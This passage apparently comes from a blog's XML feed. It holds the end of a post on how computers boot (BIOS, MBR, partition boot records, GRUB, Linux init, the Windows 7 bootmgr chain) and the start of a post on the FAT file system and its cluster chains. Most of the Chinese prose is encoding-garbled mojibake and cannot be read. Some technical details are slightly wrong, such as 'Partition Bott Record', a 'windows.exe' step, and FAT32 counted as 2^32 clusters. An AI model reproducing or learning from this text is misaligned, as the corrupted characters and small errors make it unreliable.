arefamiliar with.</p><p>Notice:</p><ul><li>Boot sequence governed by BIOS ROM</li><li>BIOS parameters stored in CMOS</li><li>BIOS ROM may be password protected</li></ul><h2 id="mbr">2. MBR</h2><p>BIOS æŒ‰ç…§"å¯åŠ¨é¡ºåº"ï¼ŒæŠŠæ§åˆ¶æƒè½¬äº¤ç»™æ’åœ¨ç¬¬ä¸€ä½çš„å‚¨å­˜è®¾å¤‡ã€‚</p><p>è¿™æ—¶ï¼Œè®¡ç®—æœºè¯»å–è¯¥è®¾å¤‡çš„ç¬¬ä¸€ä¸ªæ‰‡åŒºï¼Œä¹Ÿå°±æ˜¯è¯»å–æœ€å‰é¢çš„ 512ä¸ªå­—èŠ‚ï¼Œå³ï¼š"ä¸»å¼•å¯¼è®°å½•"ï¼ˆMaster boot recordï¼Œç¼©å†™ä¸º MBRï¼‰ã€‚å¦‚æœ MBRçš„æœ€åä¸¤ä¸ªå­—èŠ‚æ˜¯ 0x55 å’Œ0xAAï¼Œè¡¨æ˜è¿™ä¸ªè®¾å¤‡å¯ä»¥ç”¨äºå¯åŠ¨ï¼›å¦‚æœä¸æ˜¯ï¼Œè¡¨æ˜è®¾å¤‡ä¸èƒ½ç”¨äºå¯åŠ¨ï¼Œæ§åˆ¶æƒäºæ˜¯è¢«è½¬äº¤ç»™"å¯åŠ¨é¡ºåº"ä¸­çš„ä¸‹ä¸€ä¸ªè®¾å¤‡ã€‚</p><p>å…³äºä¸»å¼•å¯¼è®°å½•çš„è¯¦æƒ…ï¼Œå¯ä»¥å‚ç…§ä¹‹å‰å†™çš„ <ahref="https://xuj.me/2020/04/24/infosec/backup_recovery/0.boot_sector/">BootSector åšæ–‡</a>ï¼Œå…¶ä¸­æœ‰ MBR çš„å†…å®¹</p><p>æ ¹æ®è¯¥åšæ–‡å¯¹åˆ†åŒºè¡¨ä¸­ç¬¬ä¸€ä¸ªå­—èŠ‚çš„è®¤è¯†ï¼Œæˆ‘ä»¬çŸ¥é“å®ƒå¦‚æœä¸º0x80ï¼Œå°±è¡¨ç¤ºè¯¥ä¸»åˆ†åŒºæ˜¯æ¿€æ´»åˆ†åŒºï¼Œæ§åˆ¶æƒè¦è½¬äº¤ç»™è¿™ä¸ªåˆ†åŒºã€‚å››ä¸ªä¸»åˆ†åŒºé‡Œé¢åªèƒ½æœ‰ä¸€ä¸ªæ˜¯æ¿€æ´»çš„ã€‚</p><h2 id="ç¡¬ç›˜å¯åŠ¨">3. ç¡¬ç›˜å¯åŠ¨</h2><p>è¿™æ—¶ï¼Œè®¡ç®—æœºçš„æ§åˆ¶æƒå°±è¦ä» MBRè½¬äº¤ç»™ç¡¬ç›˜çš„æŸä¸ªåˆ†åŒºäº†ï¼Œè¿™é‡Œåˆåˆ†æˆä¸‰ç§æƒ…å†µã€‚</p><p>3.1 æƒ…å†µ Aï¼šå·å¼•å¯¼è®°å½•</p><p>ä¸Šä¸€èŠ‚æåˆ°ï¼Œå››ä¸ªä¸»åˆ†åŒºé‡Œé¢ï¼Œåªæœ‰ä¸€ä¸ªæ˜¯æ¿€æ´»çš„ã€‚è®¡ç®—æœºä¼šè¯»å–æ¿€æ´»åˆ†åŒºçš„ç¬¬ä¸€ä¸ªæ‰‡åŒºï¼Œå«åš"å·å¼•å¯¼è®°å½•"ï¼ˆVolumeBoot Recordï¼Œç¼©å†™ä¸º VBRï¼‰ï¼Œä¹Ÿæˆä¸º â€œåˆ†åŒºå¼•å¯¼è®°å½•â€ï¼ˆPartition BottRecordï¼Œç¼©å†™ä¸º PBRï¼‰</p><p>"å·å¼•å¯¼è®°å½•"çš„ä¸»è¦ä½œç”¨æ˜¯ï¼Œå‘Šè¯‰è®¡ç®—æœºï¼Œæ“ä½œç³»ç»Ÿåœ¨è¿™ä¸ªåˆ†åŒºé‡Œçš„ä½ç½®ã€‚ç„¶åï¼Œè®¡ç®—æœºå°±ä¼šåŠ è½½æ“ä½œç³»ç»Ÿäº†ã€‚</p><p>3.2 æƒ…å†µ Bï¼šæ‰©å±•åˆ†åŒºå’Œé€»è¾‘åˆ†åŒº</p><p>æ³¨ï¼šå…³äºæ‰©å±•åˆ†åŒºçš„è¯¦ç»†å†…å®¹ï¼Œä¹Ÿå¯ä»¥åŒ…å«åœ¨ä¹‹å‰å†™çš„ <ahref="https://xuj.me/2020/04/24/infosec/backup_recovery/0.boot_sector/">BootSector åšæ–‡</a>ã€‚</p><p>éšç€ç¡¬ç›˜è¶Šæ¥è¶Šå¤§ï¼Œå››ä¸ªä¸»åˆ†åŒºå·²ç»ä¸å¤Ÿäº†ï¼Œéœ€è¦æ›´å¤šçš„åˆ†åŒºã€‚ä½†æ˜¯ï¼Œåˆ†åŒºè¡¨åªæœ‰å››é¡¹ï¼Œå› æ­¤è§„å®šæœ‰ä¸”ä»…æœ‰ä¸€ä¸ªåŒºå¯ä»¥è¢«å®šä¹‰æˆ"æ‰©å±•åˆ†åŒº"ï¼ˆExtendedpartitionï¼‰ã€‚ä½†æ˜¯ï¼Œä¼¼ä¹å¾ˆå°‘é€šè¿‡è¿™ç§æ–¹å¼å¯åŠ¨æ“ä½œç³»ç»Ÿã€‚å¦‚æœæ“ä½œç³»ç»Ÿç¡®å®å®‰è£…åœ¨æ‰©å±•åˆ†åŒºï¼Œä¸€èˆ¬é‡‡ç”¨ä¸‹ä¸€ç§æ–¹å¼å¯åŠ¨ã€‚</p><p>3.3 æƒ…å†µ Cï¼šå¯åŠ¨ç®¡ç†å™¨</p><p>åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè®¡ç®—æœºè¯»å–"ä¸»å¼•å¯¼è®°å½•"å‰é¢ 446å­—èŠ‚çš„æœºå™¨ç ä¹‹åï¼Œä¸å†æŠŠæ§åˆ¶æƒè½¬äº¤ç»™æŸä¸€ä¸ªåˆ†åŒºï¼Œè€Œæ˜¯è¿è¡Œäº‹å…ˆå®‰è£…çš„"å¯åŠ¨ç®¡ç†å™¨"ï¼ˆbootloaderï¼‰ï¼Œç”±ç”¨æˆ·é€‰æ‹©å¯åŠ¨å“ªä¸€ä¸ªæ“ä½œç³»ç»Ÿã€‚</p><p>Linux ç¯å¢ƒä¸­ï¼Œç›®å‰æœ€æµè¡Œçš„å¯åŠ¨ç®¡ç†å™¨æ˜¯ grubã€‚å—¯ï¼Œç›¸ä¿¡ç©è¿‡ Linuxçš„æœ‹å‹å¯¹ grubå·²ç»ä¸é™Œç”Ÿäº†ã€‚å¦‚æœæœ‰æ—¶é—´ï¼Œè‡ªå·±å†å»è¯¦ç»†äº†è§£ä¸€ä¸‹å®ƒï¼Œå¹¶å†™ç¯‡åšæ–‡ç¬”è®°</p><h2 id="æ“ä½œç³»ç»Ÿ">4. æ“ä½œç³»ç»Ÿ</h2><p>æ§åˆ¶æƒè½¬äº¤ç»™æ“ä½œç³»ç»Ÿåï¼Œæ“ä½œç³»ç»Ÿçš„å†…æ ¸é¦–å…ˆè¢«è½½å…¥å†…å­˜ã€‚</p><p>ä»¥ Linux ç³»ç»Ÿä¸ºä¾‹ï¼Œå…ˆè½½å…¥/boot ç›®å½•ä¸‹é¢çš„kernelã€‚å†…æ ¸åŠ è½½æˆåŠŸåï¼Œç¬¬ä¸€ä¸ªè¿è¡Œçš„ç¨‹åºæ˜¯/sbin/initã€‚å®ƒæ ¹æ®é…ç½®æ–‡ä»¶ï¼ˆDebianç³»ç»Ÿæ˜¯/etc/initabï¼‰äº§ç”Ÿ init è¿›ç¨‹ã€‚è¿™æ˜¯ Linux å¯åŠ¨åçš„ç¬¬ä¸€ä¸ªè¿›ç¨‹ï¼Œpidè¿›ç¨‹ç¼–å·ä¸º 1ï¼Œå…¶ä»–è¿›ç¨‹éƒ½æ˜¯å®ƒçš„åä»£ã€‚</p><p>ç„¶åï¼Œinitçº¿ç¨‹åŠ è½½ç³»ç»Ÿçš„å„ä¸ªæ¨¡å—ï¼Œæ¯”å¦‚çª—å£ç¨‹åºå’Œç½‘ç»œç¨‹åºï¼Œç›´è‡³æ‰§è¡Œ/bin/loginç¨‹åºï¼Œè·³å‡ºç™»å½•ç•Œé¢ï¼Œç­‰å¾…ç”¨æˆ·è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ã€‚</p><p>è‡³æ­¤ï¼Œå…¨éƒ¨å¯åŠ¨è¿‡ç¨‹å®Œæˆã€‚</p><h2 id="windows-7-æ“ä½œç³»ç»Ÿå¼•å¯¼è¿‡ç¨‹">Windows 7 æ“ä½œç³»ç»Ÿå¼•å¯¼è¿‡ç¨‹</h2><p>1ã€ç”µè„‘å¼€æœºåï¼Œå¼€å§‹å¯åŠ¨ BIOSï¼Œå¼€å§‹ BIOS è‡ªæ£€ã€‚</p><p>2ã€é€šè¿‡è‡ªæ£€åï¼Œbios æ‰¾åˆ°ç¡¬ç›˜ä¸Šçš„ä¸»å¼•å¯¼è®°å½• MBR.</p><p>3ã€MBR å¼€å§‹è¯»å–ç¡¬ç›˜åˆ†åŒºè¡¨DPTï¼Œæ‰¾åˆ°æ´»åŠ¨åˆ†åŒºï¼Œæ‰¾åˆ°æ´»åŠ¨åˆ†åŒºä¸­çš„åˆ†åŒºå¼•å¯¼è®°å½• PBRï¼Œå¹¶ä¸”æŠŠæ§åˆ¶æƒäº¤ç»™PBR.</p><p>4ã€PBR æœç´¢æ´»åŠ¨åŒºä¸­çš„å¯åŠ¨ç®¡ç†å™¨ bootmgrï¼Œæ‰¾åˆ°åï¼ŒPBR æŠŠæ§åˆ¶æƒäº¤ç»™bootmgr(ç›¸å½“äº xp é‡Œçš„ ntldr æ–‡ä»¶)ã€‚</p><p>5ã€Bootmgr å¯»æ‰¾æ´»åŠ¨åˆ†åŒºä¸­çš„ boot æ–‡ä»¶å¤¹ä¸­çš„ BCDæ–‡ä»¶ï¼ˆå¯åŠ¨é…ç½®æ•°æ®ï¼Œç›¸å½“äº xp é‡Œçš„ boot.ini æ–‡ä»¶ï¼‰ã€‚</p><p>6ã€æ‰¾åˆ° BCD åï¼ŒBootmgr é¦–å…ˆä» BCD ä¸­è¯» SYS å–å¯åŠ¨ç®¡ç†å™¨ bootmgrèœå•çš„è¯­è¨€ç‰ˆæœ¬ä¿¡æ¯ï¼Œç„¶åå†è°ƒç”¨ BOOTMGR ä¸ç›¸åº”è¯­è¨€çš„ BOOTMGR.EXE.MUI ï¼ˆåœ¨bootæ–‡ä»¶å¤¹å¯¹åº”è¯­è¨€æ–‡ä»¶å¤¹ä¸­ï¼‰ç»„æˆç›¸åº”è¯­è¨€çš„å¯åŠ¨èœå•ï¼Œä¹‹ååœ¨æ˜¾ç¤ºå™¨ä¸Šæ˜¾ç¤ºå¤šæ“ä½œç³»ç»Ÿé€‰æ‹©ç”»é¢ã€‚</p><p>7ã€å¦‚æœå­˜åœ¨å¤šä¸ªæ“ä½œç³»ç»Ÿè€Œä¸”ç³»ç»Ÿè®¾ç½®çš„ç­‰å¾…æ—¶é—´ä¸æ˜¯0ï¼Œé‚£ä¹ˆå±å¹•å°±æ˜¾ç¤ºå¤šä¸ªæ“ä½œç³»ç»Ÿçš„é€‰æ‹©ç•Œé¢ã€‚å¦‚æœæ²¡æœ‰å¤šç³»ç»Ÿï¼Œé‚£ä¹ˆç›´æ¥è¿›å…¥windows 7 ç³»ç»Ÿï¼Œä¸æ˜¾ç¤ºé€‰æ‹©ç•Œé¢ã€‚</p><p>8ã€é€‰æ‹© windows 7 ç³»ç»Ÿåï¼Œbootmgr å°±ä¼šè¯»å– BCD é‡Œ win7ç³»ç»Ÿæ‰€åœ¨çš„ç›˜é‡Œçš„ windows.exe æ–‡ä»¶ï¼Œå¹¶ä¸”å°†æ§åˆ¶æƒäº¤ç»™ winload.exeã€‚</p><p>9ã€Winload.exe åŠ è½½ windows7å†…æ ¸ã€ç¡¬ä»¶ã€æœåŠ¡ç­‰ï¼Œä¹‹ååŠ è½½æ¡Œé¢ç­‰ä¿¡æ¯ï¼Œä»è€Œå¯åŠ¨æ•´ä¸ª windows 7ç³»ç»Ÿã€‚</p><p>ä¸Šé¢å‡ æ­¥å¯ä»¥æ¦‚æ‹¬ä¸€ä¸‹å°±æ˜¯:</p><p>BIOS --&gt; MBR --&gt; DPT --&gt; PBR--&gt; Bootmgr --&gt; BCD--&gt;ç³»ç»Ÿé€‰æ‹©ç•Œé¢ ---&gt; é€‰æ‹© windows7 ------&gt; Winload.exe ----&gt;å†…æ ¸åŠ è½½ç­‰ --&gt; å¯åŠ¨æ•´ä¸ª windows7 ç³»ç»Ÿ</p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><ahref="http://www.c-jump.com/CIS24/Slides/Booting/Booting.html">The BootProcess and Operating Systems</a></li><li><ahref="https://www.vskills.in/certification/tutorial/it-support/the-booting-process/">TheBooting Process</a></li><li><ahref="http://www.ruanyifeng.com/blog/2013/02/booting.html">è®¡ç®—æœºæ˜¯å¦‚ä½•å¯åŠ¨çš„ï¼Ÿ</a></li><li><ahref="https://blog.csdn.net/lanxinju/article/details/5714124">ä¸»å¼•å¯¼æ‰‡åŒºï¼ˆMBRï¼‰ï¼Œåˆ†åŒºè¡¨ï¼ˆDPTï¼‰åŠæ´»åŠ¨åˆ†åŒº(DBR)</a></li><li><ahref="https://www.jianshu.com/p/f11e6e5d5c81">æ“ä½œç³»ç»Ÿå¼•å¯¼è¿‡ç¨‹</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> os </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Boot </tag>
            
            <tag> Computer </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FAT æ–‡ä»¶ç³»ç»Ÿ</title>
      <link href="/blog/2020/04/24/os/2.fat/"/>
      <url>/blog/2020/04/24/os/2.fat/</url>
      
        <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><p>å…ˆäº†è§£ä¸€ä¸‹ï¼Œä¸åŒåŒºåŸŸçš„ç›¸å¯¹ä½ç½®ä»¥åŠå…¶åœ¨ç£ç›˜ä¸Šçš„å¤§è‡´ä½ç½®ã€‚</p><p>ä¸åŒåŒºåŸŸçš„ç›¸å¯¹ä½ç½®: <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200417080522.png"alt="ä¸åŒåŒºåŸŸçš„ç›¸å¯¹ä½ç½®" /></p><p>ä¸åŒåŒºåŸŸåœ¨ç£ç›˜ä¸Šçš„å¤§è‡´ä½ç½®: <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200417080559.png"alt="ä»ç£ç›˜çœ‹ä¸åŒåŒºåŸŸ" /></p><p>å½“ç„¶ï¼Œä¸Šå›¾è®²çš„æ˜¯ FAT16ï¼Œå…¶ FDT ç‹¬ç«‹äº DATAã€‚ FAT32 æ˜¯æ²¡æœ‰ FDTçš„ï¼Œå…¶æ ¹ç›®å½•é¡¹å­˜å‚¨åœ¨ DATA åŒºçš„å‰ç«¯ã€‚</p><h3 id="éšè—æ‰‡åŒº">éšè—æ‰‡åŒº</h3><p>éšè—æ‰‡åŒº(hidden sector)æ˜¯åœ¨åˆ†åŒºä¹‹å‰çš„éƒ¨åˆ†ã€‚é€šå¸¸æ‰€è¯´çš„MBRï¼Œå®ƒæ˜¯éšè—æ‰‡åŒºçš„ç¬¬ä¸€ä¸ªæ‰‡åŒºï¼Œä¹Ÿæ˜¯æ•´ä¸ªå­˜å‚¨ä»‹è´¨çš„ç¬¬ä¸€ä¸ªç‰©ç†æ‰‡åŒºã€‚</p><h3 id="ä¿ç•™æ‰‡åŒº">ä¿ç•™æ‰‡åŒº</h3><p>ä¿ç•™æ‰‡åŒº(reserved sector) æ˜¯åˆ†åŒºä¹‹å†…, FATè¡¨ä¹‹å‰çš„æ‰€æœ‰æ‰‡åŒºã€‚é€šå¸¸æ‰€è¯´çš„DBRï¼Œå°±æ˜¯ä¿ç•™æ‰‡åŒºçš„ç¬¬ä¸€ä¸ªé€»è¾‘æ‰‡åŒºã€‚å¦‚æœéšè—æ‰‡åŒºä¸º 0 ä¸ªï¼Œé‚£ä¹ˆ DBRæ‰€åœ¨çš„æ‰‡åŒºå°±æˆä¸ºäº†ç¬¬ä¸€ä¸ªç‰©ç†æ‰‡åŒºï¼Œå½“ç„¶ï¼Œè¿™æ˜¯ä¸å¯èƒ½çš„ã€‚ æ³¨ï¼šä¿ç•™æ‰‡åŒºåŒ…å«DBRï¼Œä½†ä¸èƒ½è®¤ä¸ºå…¶ä»…ä»…æ˜¯ DBRã€‚ä¾‹å¦‚ï¼š åœ¨ FAT32 çš„ä¿ç•™åŒºä¸­é™¤äº† DBR è¿˜æœ‰ä¸ªFSINFO ä¿¡æ¯åŒºï¼Œç”¨æ¥è®°å½•æ–‡ä»¶ç³»ç»Ÿç©ºé—²ç°‡çš„æ•°é‡ï¼Œä¸‹ä¸€å¯ç”¨ç°‡çš„ç°‡å·ã€‚</p><h2 id="windows-æ–‡ä»¶ç³»ç»Ÿ">Windows æ–‡ä»¶ç³»ç»Ÿ</h2><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200423111332.png"alt="20200423111332" /><figcaption aria-hidden="true">20200423111332</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200423111341.png"alt="20200423111341" /><figcaption aria-hidden="true">20200423111341</figcaption></figure><p>FAT 16 çš„ç»“æ„åˆ’åˆ†ä¸º:</p><div class="line-block">éšè—æ‰‡åŒº | ï¼ˆä¿ç•™æ‰‡åŒº | FAT åŒº | FDT | æ•°æ®åŒº|ï¼‰</div><p>åˆ†åŒºå‰&lt;-|-&gt;åˆ†åŒºä¹‹åï¼Œä¹Ÿå°±æ˜¯æ–‡ä»¶ç³»ç»Ÿçš„èµ·å§‹éƒ¨åˆ†ï¼ˆåé¢è¿™ä¸€éƒ¨åˆ†æ˜¯ä¸€ä¸ªä¸»åˆ†åŒºï¼ŒWindowsä¸Šä¸€èˆ¬åªæœ‰ä¸€ä¸ªä¸»åˆ†åŒºï¼Œç„¶åå°±æ˜¯æ‰©å±•åˆ†åŒºäº†ï¼‰</p><blockquote><p>æ³¨: FAT32 å•ä¸ªæ–‡ä»¶æœ€å¤§ 4GBï¼Œä¹Ÿä»ä¸€ä¸ªæ–¹é¢ä½“ç°å‡ºå®ƒå·²ç»è·Ÿä¸ä¸Šæ—¶ä»£çš„æ­¥ä¼äº†ï¼Œå½“å‰ Windowsä¸€èˆ¬éƒ½æ˜¯ä½¿ç”¨ NTFS äº†</p></blockquote><h2 id="fat">FAT</h2><p>FATï¼ˆFile Allocation Tableï¼‰æ–‡ä»¶ç³»ç»Ÿæ˜¯ Windowsæ“ä½œç³»ç»Ÿæ‰€ä½¿ç”¨çš„ä¸€ç§æ–‡ä»¶ç³»ç»Ÿã€‚</p><p>FAT æ–‡ä»¶ç³»ç»Ÿçš„å‘å±•ç»å†äº† FAT12ã€FAT16 å’Œ FAT32 ä¸‰ä¸ªé˜¶æ®µã€‚å½“ç„¶ï¼Œç›®å‰Windows ä¸»è¦ä½¿ç”¨æ›´é«˜çº§çš„ NTFS äº†ã€‚</p><h2 id="fat-è¡¨">FAT è¡¨</h2><p>FAT è¡¨ï¼ˆFAT æ–‡ä»¶åˆ†é…è¡¨ï¼‰å¯ä»¥çœ‹ä½œæ˜¯ DOSæ–‡ä»¶ç®¡ç†ç³»ç»Ÿç”¨æ¥è®°å½•æ¯ä¸ªæ–‡ä»¶çš„å­˜å‚¨ä½ç½®çš„è¡¨æ ¼ï¼ŒFATæ–‡ä»¶ç³»ç»Ÿä½¿ç”¨â€ç°‡â€œä¸ºæ•°æ®å•å…ƒï¼Œä»¥é“¾çš„æ–¹å¼å­˜æ”¾ç°‡å·ï¼Œæ‰€æœ‰ç°‡ä» 2å·å¼€å§‹ç¼–å·ï¼ˆNTFS çš„ç°‡ä» 0 å·å¼€å§‹ï¼‰ã€‚æ¯ä¸ªç°‡åœ¨ FATè¡¨ä¸­å æœ‰ä¸€ä¸ªç™»è®°é¡¹ï¼Œå³ï¼šFAT ç°‡ç™»è®°é¡¹ã€‚ åˆå› ä¸º FATè¡¨çš„å‰ä¸¤ä¸ªç™»è®°é¡¹æ˜¯ç‰¹æ®Šæ ‡è®°ï¼Œæ‰€ä»¥ä» 2 å·å¼€å§‹ï¼Œç°‡ç¼–å·å¯¹åº”ç™»è®°é¡¹ç¼–å·ã€‚</p><p>FATè¡¨é€šè¿‡æè¿°æ–‡ä»¶ç³»ç»Ÿå†…çš„ç°‡åˆ†é…çŠ¶æ€ï¼Œè¯´æ˜æ–‡ä»¶ç³»ç»Ÿå†…æ•°æ®æ‰€åˆ†é…çš„è¿ç»­ç°‡çš„é¡ºåºå…³ç³»(å³è¡¨æ˜æ–‡ä»¶æˆ–ç›®å½•çš„ä¸‹ä¸€ç°‡çš„åºå·)ã€‚</p><p>FATè¡¨ä¸­æ²¡æœ‰æŒ‡å‡ºå“ªä¸ªæ˜¯æ–‡ä»¶çš„ç¬¬ä¸€ä¸ªç°‡ï¼Œæ‰€ä»¥å¿…é¡»ä»ç›®å½•ä¸­æå–æ–‡ä»¶çš„é¦–åœ°å€ï¼Œç„¶åé€šè¿‡FAT æ¥è®¿é—®å‰©ä¸‹çš„ç°‡ã€‚æ‰€ä»¥ï¼Œéƒ½æ˜¯å…ˆå»FDT(æ–‡ä»¶ç›®å½•è¡¨)ä¸­è·å¾—æ–‡ä»¶çš„é¦–ç°‡å·ï¼Œç„¶ååˆ° FAT è¡¨ä¸­ç¡®å®šæ–‡ä»¶çš„ç°‡é“¾ã€‚</p><p>åˆ†é…ç»™æ–‡ä»¶çš„ç°‡çš„æ€»å­—èŠ‚æ•°å¿…é¡»å¤§äºç›®å½•è®°å½•ä¸­æ–‡ä»¶å¤§å°åŒºåŸŸæŒ‡å‡ºçš„æ–‡ä»¶å¤§å°ã€‚é™¤éæ–‡ä»¶çš„å¤§å°æ˜¯ç°‡çš„æ•´æ•°å€çš„è¯ï¼Œå¦åˆ™æœ€åä¸€ä¸ªç°‡çš„æœ«å°¾å°±ä¼šæœ‰ä¸€éƒ¨åˆ†æœªä½¿ç”¨çš„ç©ºé—´ã€‚æ–‡ä»¶å¤§å°æ˜¯0 çš„æ–‡ä»¶å°†ä¸ä¼šåˆ†é…ç°‡ï¼Œåœ¨ç›®å½•è®°å½•ä¸­çš„ç°‡æ•°é‡åº”è¯¥ä¸º 0ã€‚</p><p>æ ¹æ® FAT è¡¨ä¸­æ¯ä¸ªç™»è®°é¡¹æ‰€å çš„ä½æ•°å°† FAT åˆ’åˆ†ä¸ºäº† FAT12ï¼Œ FAT16ï¼ŒFAT32ã€‚</p><ol type="1"><li><p>FAT12</p><p>12 ä½è¡¨é¡¹å€¼ï¼Œå¯è¡¨ç¤º 4096 ä¸ªç°‡ æ¯ç°‡ 64 ä¸ªæ‰‡åŒº(32KB)ï¼Œå¯è¡¨ç¤º 262144ä¸ªæ‰‡åŒº</p></li><li><p>FAT 16</p><p>16 ä½è¡¨é¡¹å€¼ï¼Œå¯è¡¨ç¤º 65 535 ä¸ªç°‡ ä¸€èˆ¬æ¯ç°‡ä¸å¤šäº 64 ä¸ªæ‰‡åŒº(32KB)ã€‚æœ€å¤šç®¡ç† 32x65535=2097120KB=2048MB=2GB 4 ä¸ªåˆ†åŒºï¼Œå³ç®¡ç† 2x4=8GB</p></li><li><p>FAT32</p><p>32 ä½è¡¨é¡¹å€¼ï¼Œå¯è¡¨ç¤º 4294967296 ä¸ªç°‡ è‹¥æ¯ä¸ªç°‡ 4KBï¼Œç†è®ºå¯ç®¡ç† 4KBx4294967296 =16TB Windows 2000 ä»¥å‰ï¼Œç°‡æœ€å¤§å•ä½ä¸º 64 ä¸ªæ‰‡åŒºï¼Œä¹‹åä¸º 128ä¸ªæ‰‡åŒº</p></li></ol><ul><li><strong>FATæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œé‡è¦çš„æ•°æ®ç»“æ„ä¸ºæ–‡ä»¶åˆ†é…è¡¨å’Œç›®å½•é¡¹ã€‚</strong></li><li>FAT åœ¨ DOS å¼•å¯¼æ‰‡åŒºä¹‹åï¼Œæœ‰ä¸¤ä¸ªï¼ŒåŸºæœ¬è¡¨å’Œå¤‡ä»½ã€‚</li><li>æ¯ä¸ª FAT æ‰€å æ‰‡åŒºæ•°é€šè¿‡ BPB åç§» 16H å’Œ 24H å¤„çš„å€¼ç¡®å®š</li></ul><p>å¸¸è§„è§„åˆ™ï¼š</p><ul><li><p>æ•°é‡ï¼šé€šå¸¸æƒ…å†µä¸‹ä¸€ä¸ª FAT æ–‡ä»¶ç³»ç»Ÿä¼šæœ‰ä¸¤ä¸ª FAT è¡¨ï¼Œä½†æœ‰æ—¶å€™ä¹Ÿä¼šå…è®¸åªæœ‰ä¸€ä¸ª FAT è¡¨ï¼Œ FAT è¡¨çš„å…·ä½“ä¸ªæ•°è®°å½•åœ¨å¼•å¯¼æ‰‡åŒºçš„ åç§»0x10 å­—èŠ‚å¤„ã€‚</p></li><li><p>ä½ç½®ï¼šå› ä¸º FAT åŒºä½äºæ–‡ä»¶ç³»ç»Ÿçš„ä¿ç•™åŒºä¹‹åï¼Œæ‰€ä»¥ FAT1åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä½ç½®å¯ä»¥é€šè¿‡å¼•å¯¼è®°å½•ä¸­åç§» 0x0E~0x0Få­—èŠ‚å¤„çš„â€œä¿ç•™æ‰‡åŒºâ€æ•°å¾—åˆ°ã€‚</p></li><li><p>FAT2 ç´§è·Ÿåœ¨ FAT1 ä¹‹åï¼Œ å®ƒçš„ä½ç½®å¯ä»¥é€šè¿‡ FAT1 çš„ä½ç½®åŠ ä¸Šæ¯ä¸ª FATè¡¨çš„å¤§å°æ‰‡åŒºæ•°è·å¾—ã€‚</p></li></ul><p>FAT è¡¨ä¸­è®°å½•äº†æ¯ä¸ªæ–‡ä»¶çš„ç°‡é“¾ç»“æ„ï¼›FATè¡¨ä¸­è®°å½•çš„ä¸æ•°æ®åŒºç°‡å¯¹åº”çš„è¡¨é¡¹ï¼Œä» 0å·æ ‡è®°å¼€å§‹è‡³å½“å‰æ•°æ®åŒºæ‰€åˆ†é…çš„ç°‡çš„æœ€å¤§æ•°å€¼ï¼Œè®°å½•ç°‡ä¿¡æ¯åˆ° FATé¡¹ï¼›ä½†æ˜¯æ³¨æ„ï¼šå…¶ä¸­ 0 å·~1å·ç°‡çš„å€¼éƒ½æ˜¯æ“ä½œç³»ç»Ÿé¢„å…ˆä¸ç•™è®¾å®šçš„ç‰¹æ®Šæ ‡è®°ï¼Œè€Œæ•°æ®åŒºçš„èµ·å§‹ç°‡æ˜¯ 2å·ç°‡ã€‚</p><h3 id="fat16">FAT16</h3><h4 id="fat16-ç»“æ„">FAT16 ç»“æ„</h4><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200423124733.png"alt="20200423124733" /><figcaption aria-hidden="true">20200423124733</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200423122329.png"alt="20200423122329" /><figcaption aria-hidden="true">20200423122329</figcaption></figure><h4 id="fat16-ç°‡ç™»è®°é¡¹">FAT16 ç°‡ç™»è®°é¡¹</h4><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200423132150.png"alt="FAT16 ç™»è®°é¡¹è¡¨" /><figcaption aria-hidden="true">FAT16 ç™»è®°é¡¹è¡¨</figcaption></figure><p>ä¸è¯¦ç»†ä»‹ç»ã€‚ä»…ä»¥å®ä¾‹æ¥ä»‹ç»ç°‡é“¾çš„æ¦‚å¿µã€‚</p><figure><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20200423134140.png"alt="FAT16 å®ä¾‹" /><figcaption aria-hidden="true">FAT16 å®ä¾‹</figcaption></figure><p>éœ€è¦æ ¹æ® â€œFAT16 ç™»è®°é¡¹è¡¨â€ ä¸€å›¾ä¸­çš„ 16 ä½è¡¨é¡¹å€¼é‚£ä¸€åˆ—æ¥åˆ¤æ–­ã€‚ é¦–å…ˆï¼Œ0å·å’Œ 1 å·ç°‡æ˜¯ç‰¹æ®Šæ ‡è®°ï¼Œæˆ‘ä»¬ä¸ç”¨ç®¡ã€‚ä» 2 å·ç°‡å¼€å§‹ï¼Œ</p><ol type="1"><li>2 å·ç°‡ï¼š 0xFFFF è¡¨ç¤ºæ–‡ä»¶ç»“æŸï¼Œè¯´æ˜è¯¥æ–‡ä»¶åªç”¨äº†è¿™ä¸€ä¸ªç°‡ã€‚</li><li>3 å·ç°‡ï¼š 0x0004 è¡¨ç¤ºå·²åˆ†é…ç°‡ï¼Œå…¶å€¼ä¸º 4ï¼Œè¡¨ç¤ºè¯¥æ–‡ä»¶å¹¶æœªç»“æŸï¼Œä¸‹ä¸€ç°‡æ˜¯4 å·ç°‡</li><li>4 å·ç°‡ åŒä¸Šï¼Œè¯´æ˜è¿˜æ˜¯ä¸Šé¢ä¸€ä¸ªæ–‡ä»¶çš„ä¸‹ä¸€ç°‡åœ¨ 5 å·ç°‡</li><li>5 å·ç°‡ åŒä¸Šï¼ŒåŒä¸Šï¼Œè¯´æ˜è¿˜æ˜¯ä¸Šé¢ä¸€ä¸ªæ–‡ä»¶çš„ä¸‹ä¸€ç°‡åœ¨ 6 å·ç°‡</li><li>6 å·ç°‡ 0xFFFFï¼Œè¯´æ˜æ–‡ä»¶ç»“æŸï¼Œè¡¨ç¤ºä» 3 å·ç°‡åˆ° 6å·ç°‡ï¼Œä¸€ä¸ªæ–‡ä»¶çš„ç°‡é“¾ç»“æŸã€‚</li><li>7 å·ç°‡ 0xFF 